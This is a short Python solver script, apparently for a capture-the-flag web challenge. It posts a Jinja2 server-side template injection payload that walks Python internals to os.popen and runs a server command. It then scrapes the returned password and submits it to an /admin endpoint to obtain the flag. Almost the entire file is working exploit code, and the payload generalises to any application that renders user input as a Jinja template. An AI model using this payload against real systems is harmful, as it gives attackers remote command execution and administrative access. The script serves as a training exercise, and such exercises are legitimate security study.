import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, find_flag

import bs4 as BeautifulSoup

BASE_URL = "https://jinja-ninja.quoccacorp.com"
PAYLOAD = "{{self.__init__.__globals__.__builtins__.__import__('os').popen('/getpassword').read()}}"

class Solver:
    def __init__(self):
        self.session = get_session()

    def run(self):
        response = self.session.post(BASE_URL, data={"content": PAYLOAD})
        soup = BeautifulSoup.BeautifulSoup(response.text, "html.parser")
        code = soup.find("code").text.strip()

        response = self.session.post(f"{BASE_URL}/admin", data={"password": code})
        find_flag(response.text)

if __name__ == "__main__":
    Solver().run()